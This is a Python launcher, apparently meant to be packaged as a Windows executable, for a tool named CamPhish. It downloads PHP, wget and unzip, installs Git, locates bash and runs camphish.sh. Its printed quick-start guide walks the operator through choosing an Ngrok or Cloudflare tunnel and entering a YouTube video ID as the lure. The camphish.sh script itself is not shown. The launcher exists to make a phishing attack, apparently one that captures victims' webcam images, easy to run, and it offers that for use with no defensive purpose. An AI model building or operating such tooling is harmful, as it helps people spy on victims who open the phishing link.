import subprocess
import sys
import os
import urllib.request
import zipfile
import shutil

# ── Config ────────────────────────────────────────────────────────────────────
PHP_VERSION  = "8.3.22"
PHP_ZIP_URL  = f"https://windows.php.net/downloads/releases/php-{PHP_VERSION}-nts-Win32-vs16-x64.zip"
PHP_DIR_NAME = "php"

# Git Bash ships wget, unzip, curl — we look in all known locations
GIT_TOOL_DIRS = [
    # Standard Git for Windows installer
    r"C:\Program Files\Git\usr\bin",
    r"C:\Program Files\Git\bin",
    r"C:\Program Files (x86)\Git\usr\bin",
    r"C:\Program Files (x86)\Git\bin",
    # Chocolatey git package
    r"C:\ProgramData\chocolatey\lib\git\tools\usr\bin",
    r"C:\ProgramData\chocolatey\lib\git\tools\bin",
    r"C:\ProgramData\chocolatey\bin",
    # MSYS2
    r"C:\msys64\usr\bin",
    r"C:\msys32\usr\bin",
]

BASH_CANDIDATES = [
    r"C:\Program Files\Git\bin\bash.exe",
    r"C:\Program Files (x86)\Git\bin\bash.exe",
    r"C:\ProgramData\chocolatey\lib\git\tools\bin\bash.exe",
    r"C:\msys64\usr\bin\bash.exe",
    r"C:\msys32\usr\bin\bash.exe",
    r"C:\Windows\System32\bash.exe",   # WSL bash
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def run_silent(cmd, **kwargs):
    return subprocess.run(cmd, capture_output=True, **kwargs)

def is_cmd_available(cmd):
    """Check if a command exists on PATH without running it."""
    return shutil.which(cmd) is not None

def prepend_path(directory):
    os.environ["PATH"] = directory + os.pathsep + os.environ.get("PATH", "")

def refresh_path_from_registry():
    """
    Read the current system + user PATH from the Windows registry
    so that tools installed after this process started are visible.
    """
    try:
        import winreg
        paths = []
        keys = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
             "Path"),
            (winreg.HKEY_CURRENT_USER,
             r"Environment",
             "Path"),
        ]
        for hive, subkey, value in keys:
            try:
                with winreg.OpenKey(hive, subkey) as key:
                    data, _ = winreg.QueryValueEx(key, value)
                    paths.append(data)
            except FileNotFoundError:
                pass
        if paths:
            combined = os.pathsep.join(paths)
            os.environ["PATH"] = combined + os.pathsep + os.environ.get("PATH", "")
    except Exception:
        pass  # non-Windows or registry error — silently skip

# ── Find camphish.sh ──────────────────────────────────────────────────────────

def find_script(base_dir):
    candidates = [
        os.path.join(base_dir, "camphish.sh"),
        os.path.join(os.path.dirname(base_dir), "camphish.sh"),
        os.path.join(os.getcwd(), "camphish.sh"),
    ]
    for p in candidates:
        if os.path.isfile(p):
            return os.path.abspath(p)
    return None

# ── Ensure Git Bash tools (wget, unzip, curl) ────────────────────────────────

# wget standalone download (GNU wget for Windows)
WGET_URL        = "https://eternallybored.org/misc/wget/releases/wget-1.21.4-win64.zip"
# unzip standalone download (Info-ZIP for Windows)
UNZIP_URL       = "https://downloads.sourceforge.net/project/gnuwin32/unzip/5.51-1/unzip-5.51-1-bin.zip"
WGET_EXE_IN_ZIP = "wget.exe"

def _download_exe_from_zip(url, exe_name, dest_dir, label):
    """Generic: download a zip from url, extract exe_name into dest_dir."""
    zip_path = os.path.join(dest_dir, f"_{label}_tmp.zip")
    print(f"[*] {label} not found. Downloading {label} automatically...")

    def _progress(b, bs, total):
        if total > 0:
            print(f"\r    {min(b * bs * 100 // total, 100)}%", end="", flush=True)

    try:
        urllib.request.urlretrieve(url, zip_path, reporthook=_progress)
        print("\r    Done.        ")
        with zipfile.ZipFile(zip_path, "r") as zf:
            for member in zf.namelist():
                if member.lower().endswith(exe_name.lower()):
                    data = zf.read(member)
                    dest = os.path.join(dest_dir, exe_name)
                    with open(dest, "wb") as f:
                        f.write(data)
                    print(f"[+] {label} installed to: {dest}")
                    return dest
        print(f"[-] Could not find {exe_name} inside the downloaded zip.")
    except Exception as e:
        print(f"[-] {label} auto-download failed: {e}")
    finally:
        if os.path.isfile(zip_path):
            os.remove(zip_path)
    return None

def ensure_git_tools(base_dir):
    """
    Make sure wget, unzip, and curl are on PATH.
    Priority:
      1. Already on PATH → nothing to do.
      2. Found in Git Bash / MSYS2 dirs → prepend to PATH.
      3. wget or unzip missing → auto-download standalone exe.
    """
    # Refresh PATH from registry (picks up newly installed Git)
    refresh_path_from_registry()

    # Prepend all known Git / MSYS2 bin dirs
    for d in GIT_TOOL_DIRS:
        if os.path.isdir(d):
            prepend_path(d)

    still_missing = [t for t in ("wget", "unzip", "curl") if not is_cmd_available(t)]
    if not still_missing:
        return

    # Auto-fix wget by downloading standalone exe
    if "wget" in still_missing:
        dest = _download_exe_from_zip(WGET_URL, "wget.exe", base_dir, "wget")
        if dest:
            prepend_path(os.path.dirname(dest))
            still_missing = [t for t in still_missing if not is_cmd_available(t)]

    # Auto-fix unzip by downloading standalone exe
    if "unzip" in still_missing:
        dest = _download_exe_from_zip(UNZIP_URL, "unzip.exe", base_dir, "unzip")
        if dest:
            prepend_path(os.path.dirname(dest))
            still_missing = [t for t in still_missing if not is_cmd_available(t)]

    if not still_missing:
        return

    # Any remaining tools we can't auto-fix — show instructions
    print()
    print("━" * 62)
    print("  MISSING TOOLS: " + ", ".join(still_missing).upper())
    print("━" * 62)
    print()
    print("  These tools are needed by CamPhish.")
    print("  The easiest way to get them is installing Git for Windows:")
    print()
    print("    1. Go to: https://git-scm.com/download/win")
    print("    2. Download and run the installer")
    print("    3. Keep all default settings and click Next/Install")
    print("    4. Restart this program")
    print()
    print("  Or via PowerShell (run as Administrator):")
    print("    winget install --id Git.Git -e")
    print()
    print("━" * 62)
    input("\nPress Enter to exit...")
    sys.exit(1)

# ── Ensure PHP ────────────────────────────────────────────────────────────────

def ensure_php(base_dir):
    if is_cmd_available("php"):
        return

    bundled = os.path.join(base_dir, PHP_DIR_NAME, "php.exe")
    if os.path.isfile(bundled):
        prepend_path(os.path.dirname(bundled))
        print("[+] PHP: using bundled copy.")
        return

    print(f"[*] PHP not found. Downloading PHP {PHP_VERSION}...")
    php_dir  = os.path.join(base_dir, PHP_DIR_NAME)
    zip_path = os.path.join(base_dir, "_php_tmp.zip")

    def _progress(b, bs, total):
        if total > 0:
            print(f"\r    {min(b * bs * 100 // total, 100)}%", end="", flush=True)

    try:
        urllib.request.urlretrieve(PHP_ZIP_URL, zip_path, reporthook=_progress)
        print("\r    Done.        ")
        os.makedirs(php_dir, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zf:
            zf.extractall(php_dir)
    except Exception as e:
        print(f"[-] PHP auto-download failed: {e}")
        print()
        print("━" * 62)
        print("  HOW TO INSTALL PHP MANUALLY")
        print("━" * 62)
        print()
        print("  Option 1 — Download from php.net (recommended):")
        print("    1. Open: https://windows.php.net/download/")
        print("    2. Download 'VS16 x64 Non Thread Safe' ZIP")
        print("    3. Extract to a folder, e.g.:  C:\\php")
        print("    4. Add that folder to your system PATH:")
        print("       Start → 'Edit the system environment variables'")
        print("       → Environment Variables → Path → New → C:\\php")
        print("    5. Open a new terminal and run: php --version")
        print()
        print("  Option 2 — Install via winget:")
        print("    winget install PHP.PHP")
        print()
        print("  Option 3 — Install via Chocolatey:")
        print("    choco install php")
        print()
        print("  After installing PHP, re-run this program.")
        print("━" * 62)
        input("\nPress Enter to exit...")
        sys.exit(1)
    finally:
        if os.path.isfile(zip_path):
            os.remove(zip_path)

    prepend_path(php_dir)
    if is_cmd_available("php"):
        print("[+] PHP installed successfully.")
    else:
        print("[-] PHP install failed.")
        sys.exit(1)

# ── Ensure Bash ───────────────────────────────────────────────────────────────

def find_bash_exe():
    for p in BASH_CANDIDATES:
        if os.path.isfile(p):
            return p
    return None

def install_git_via_winget():
    print("[*] Attempting to install Git (bash) via winget...")
    try:
        result = subprocess.run(
            ["winget", "install", "--id", "Git.Git", "-e", "--silent",
             "--accept-package-agreements", "--accept-source-agreements"],
            timeout=300,
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        print(f"    winget failed: {e}")
    return False

def ensure_bash():
    if is_cmd_available("bash"):
        return "bash"

    bash_exe = find_bash_exe()
    if bash_exe:
        print(f"[+] Bash found at: {bash_exe}")
        return bash_exe

    if install_git_via_winget():
        new_git_bash = r"C:\Program Files\Git\bin\bash.exe"
        if os.path.isfile(new_git_bash):
            print("[+] Git installed. Using bash.")
            return new_git_bash

    print("[-] Could not find or install bash automatically.")
    print("    Please install Git for Windows from: https://git-scm.com/download/win")
    input("\nPress Enter to exit...")
    sys.exit(1)

# ── Instructions ─────────────────────────────────────────────────────────────

def print_instructions():
    line = "━" * 62
    print()
    print(line)
    print("  CAMPHISH — QUICK START GUIDE")
    print(line)
    print()
    print("  STEP 1 — Choose a tunnel server when asked:")
    print("    [01] Ngrok        → requires a free account at ngrok.com")
    print("    [02] CloudFlare   → no account needed  ✅ (recommended)")
    print()
    print("  STEP 2 — Enter YouTube video watch ID:")
    print("    The ID is the part after '?v=' in the YouTube URL.")
    print("    Example URL : youtube.com/watch?v=dQw4w9WgXcQ")
    print("    Enter this  : dQw4w9WgXcQ")
    print()
    print("  HOW TO PASTE in this terminal:")
    print("    • Right-click  → pastes automatically  ✅ (easiest)")
    print("    • Shift+Insert → works in all Windows consoles")
    print("    • Ctrl+Shift+V → works in Windows Terminal app")
    print()
    print("  TO STOP / EXIT at any time:")
    print("    Press Ctrl + C  in this window")
    print()
    print(line)
    print()

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    # Show quick-start guide
    print_instructions()

    # --- Find camphish.sh ---
    script_path = find_script(base_dir)
    if not script_path:
        print("[-] camphish.sh not found. Please place it in the same folder as this exe.")
        input("\nPress Enter to exit...")
        sys.exit(1)
    script_dir = os.path.dirname(script_path)
    print(f"[+] Script  : {script_path}")

    # --- PHP ---
    ensure_php(base_dir)

    # --- wget / unzip / curl (from Git Bash, or auto-downloaded) ---
    ensure_git_tools(base_dir)

    # --- Bash ---
    bash_cmd = ensure_bash()
    print(f"[+] Bash    : {bash_cmd}")
    print()

    # --- Run ---
    try:
        subprocess.run([bash_cmd, script_path], cwd=script_dir, env=os.environ.copy())
        input("\nScript finished. Press Enter to exit...")
    except FileNotFoundError as e:
        print(f"\n[-] Could not launch bash: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)

if __name__ == "__main__":
    main()
